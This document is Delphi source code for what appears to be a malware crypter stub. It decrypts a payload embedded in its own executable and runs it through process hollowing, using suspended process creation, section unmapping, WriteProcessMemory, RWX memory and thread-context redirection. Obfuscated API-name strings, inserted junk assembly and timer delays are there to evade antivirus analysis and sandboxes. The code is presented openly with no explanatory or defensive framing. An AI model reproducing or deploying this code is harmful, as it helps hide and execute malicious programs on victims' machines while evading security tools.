  CloseHandle := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQRlAWylXDfiPe5L3', 'tHYgrzAFcPiJHdrJHbm')));

  CreateFile := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQR9K7fMn7nv7ZO3B', 'zFlNKafxwfsnfAHLfWCjGZw')));

  SetFilePointer := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ3lX8nv7ZOXTWdiP8OMD', 'CDywdAHnPxCSBZZPASVWd')));

  WriteFile := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQX9KNVLXLdiA7', 'S_PzQXosyKgaENJDGjBTsnsE')));

  Sleep := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ3lA7OMJ', 'JRpCYof_')));

  GetFileSize := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQnlX8nv7ZOXhNsv3', 'pUsufQZVJndAuGwpBJkHAi')));

  ReadFile := GetProcAddress(GetmoduleHandle(pChar(Kernel32)), Pchar(MyCryptFunction('C_P4_fpp2MSnh19Zg6ng6EgQ3vXjOBON5L3', 'jDiQwAFZtaeafDC')));

end;

type
  TByteArray = array of Byte;

procedure MyCopyMemory(Destination: Pointer; Source: Pointer; Length: LongWord);
begin
  
  Move(Source^, Destination^, Length);
  
end;

procedure Move(Destination, Source: Pointer; dLength:Cardinal);
begin
  
  MyCopyMemory(Destination, Source, dLength);
  
end;

function StrToByteArray(Str: string): TByteArray;
begin
  
  SetLength(result, Length(Str));
  
  MyCopyMemory(@Result[0], @Str[1], Length(Str));
  
end;

procedure RunEXE(bFile: TByteArray; sVictim: string; Parameters: string = '');
var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;
  PI:         TProcessInformation;
  SI:         TStartUpInfo;
  CONT:       TContext;
  ImageBase:  Pointer;
  Ret:        DWORD;
  i:          integer;
  Addr:       DWORD;
  dOffset:    DWORD;
begin
  
  FillChar(SI, SizeOf(TStartupInfo),0);
  
  FillChar(PI, SizeOf(TProcessInformation),0);
  
  FillChar(CONT, SizeOf(TContext), 0);
asm
ja @00000007
@00000007:
jno @00000005
@00000005:
push edi
sal esp, $00000060
pop edi
end;
  
  SI.cb := SizeOf(TStartupInfo);
  
  CONT.ContextFlags := CONTEXT_FULL;
  
  Move(@IDH, @bFile[0], 64);
  
  Move(@INH, @bFile[IDH._lfanew], 248);
  


  //CreateProcess(pchar(sVictim), PChar(Parameters), nil, nil, FALSE, $00000004, nil, nil, SI, PI);
  CreateProcess(nil, pChar(sVictim + Parameters), nil, nil, FALSE, $00000004, nil, nil, SI, PI);

  GetThreadContext(PI.hThread, CONT);
  
  CallAPI(ReadProcessMemory, [PI.hProcess, Ptr(CONT.Ebx + 8), @Addr, 4, Ret, 99999, 0, 0]);

  CallAPI(NtUnmapViewOfSection, [PI.hProcess, @Addr, 99999, 0, 0]);

  ImageBase := VirtualAllocEx(PI.hProcess, Ptr(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, $2000 or $1000, 4);

  CallAPI(WriteProcessMemory, [PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret, 99999, 0, 0]);

  dOffset := IDH._lfanew + 248;

  for i := 0 to INH.FileHeader.NumberOfSections - 1 do
  begin

    Move(@ISH, @bFile[dOffset + (i * 40)], 40);

    CallAPI(WriteProcessMemory, [PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret, 99999, 0, 0]);
asm
ja @00000007
@00000007:
jno @00000005
@00000005:
push edi
sal esp, $00000060
pop edi
end;

    CallAPI(VirtualProtectEx, [PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, $40, @Addr, 99999, 0, 0]);

  end;
  CallAPI(WriteProcessMemory, [PI.hProcess, Ptr(CONT.Ebx + 8), @ImageBase, 4, Ret, 99999, 0, 0]);

  CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;

  SetThreadContext(PI.hThread, CONT);

  CallAPI(ResumeThread, [PI.hThread, 99999, 0, 0]);

end;

function LerArquivo(FileName: String): String;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
  imagem: pointer;
  tamanho: DWORD;
begin

  result := '';

  imagem := nil;

  hFile := CallAPI(CreateFile, [PChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0, 99999, 0, 0]);

  tamanho := CallAPI(GetFileSize, [hFile, nil, 99999, 0, 0]);

  GetMem(imagem, tamanho);
asm
ja @00000007
@00000007:
jno @00000005
@00000005:
push edi
sal esp, $00000060
pop edi
end;

  ReadFile(hFile, imagem^, tamanho, lpNumberOfBytesRead, nil);

  setstring(result, Pchar(imagem), tamanho);

  freemem(imagem, tamanho);

  CallAPI(CloseHandle, [hFile, 99999, 0, 0]);

end;

function randomstring(QtdeChars: integer): string;
const
  Chars = 'ysObw+fnBrxuPTpec2diCkGNWmv7/JI6A1Eo34DlMa8qU9HVhRzKgQSZ5YtF0XjL';
var
  S: string;
  i, N: integer;
begin
  Randomize;
  S := '';
  for i := 1 to QtdeChars do
  begin
    N := Random(Length(Chars)) + 1;
    S := S + Chars[N];
  end;
  Result := S;
end;

procedure Start;
var
  TempStr: string;
  Tba: TByteArray;
  i: integer;
begin

  LoadApis;

  TempStr := LerArquivo(ParamStr(0));


  Delete(TempStr, 1, pos(MasterDelimitador, TempStr) - 1);
  
  Delete(TempStr, 1, length(MasterDelimitador));
  
  Delete(TempStr, 1, pos(MasterDelimitador, TempStr) - 1);
  
  Delete(TempStr, 1, length(MasterDelimitador));


  TempStr := copy(TempStr, 1, pos(MasterDelimitador, TempStr) - 1);

  TempStr := MyCryptFunction(TempStr, CryptPass);
asm
jc @00000008
@00000008:
push edi
push ecx
test eax, $0000954E
pop ecx
pop edi
jge @00000004
@00000004:
rol di, $000000A0
jge @00000007
@00000007:
push ebx
push $0000000D
add esp, $00000004
pop ebx
cld 
end;

  Tba := StrToByteArray(TempStr);

  TempStr := '';

  For i := 1 to 10 do if ParamStr(i) <> '' then TempStr := TempStr + ' "' + ParamStr(i) + '"';

  RunEXE(Tba, Paramstr(0), TempStr);

  CallAPI(Sleep, [5000, 99999, 0, 0]);
  ExitProcess(0);
end;

VAR
  Timer1State  : Boolean;
  Timer1Handle : WORD;
  Timer2State  : Boolean;
  Timer2Handle : WORD;
  Msg : TMSG;
  nBegin    : INTEGER;
  nEnd : INTEGER;
  TempStr: String;
  
procedure Timer1(Wnd:HWnd;Msg,TimerID,dwTime:DWORD);stdcall;
begin
asm
ja @00000007
@00000007:
jno @00000005
@00000005:
push edi
sal esp, $00000060
pop edi
end;

  if Timer1State = False Then Exit;

  inc(nBegin);

end;

procedure Timer2(Wnd:HWnd;Msg,TimerID,dwTime:DWORD);stdcall;
begin
asm
ja @00000007
@00000007:
jno @00000005
@00000005:
push edi
sal esp, $00000060
pop edi
end;

  if Timer2State = False Then Exit;

  if nBegin>=nEnd then
  begin
    Timer1State := false;

    Timer2State := false;
asm
jc @00000008
@00000008:
push edi
push ecx
test eax, $0000954E
pop ecx
pop edi
jge @00000004
@00000004:
rol di, $000000A0
jge @00000007
@00000007:
push ebx
push $0000000D
add esp, $00000004
pop ebx
cld 
end;

    Start;
  end;
end;

Procedure StartTimer1(Interval : INTEGER);
BEGIN

  Timer1State := True;

  Timer1Handle := SetTimer(0,0,Interval,@Timer1);

END;

Procedure StartTimer2(Interval : INTEGER);
BEGIN

  Timer2State := True;

  Timer2Handle := SetTimer(0,0,Interval,@Timer2);

END;

const
  XXX = 'fLAxfmXflSL_rj';
var
  Form1: TMemoryStream; 
  BMP: TBitmap;  
begin
  Form1 := TMemoryStream.Create;
  BMP := TBitmap.Create;
  try
    BMP.LoadFromStream(Form1);
	finally
	BMP.Free;
  end;
  

  randomize;

  while randomstring(3) <> XXX[3] + XXX[5] + XXX[2] do TempStr := randomstring(random(9));

  Timer1State := FALSE;

  Timer2State := FALSE;

  nBegin := 1;

  nEnd   := 10;

  StartTimer1(1000);

  StartTimer2(10);
asm
jc @00000008
@00000008:
push edi
push ecx
test eax, $0000954E
pop ecx
pop edi
jge @00000004
@00000004:
rol di, $000000A0
jge @00000007
@00000007:
push ebx
push $0000000D
add esp, $00000004
pop ebx
cld 
end;

  while GetMessageA (Msg, 0, 0, 0) do
  begin
    TranslateMessage (Msg);
    DispatchMessageA (Msg);
  end;
end.
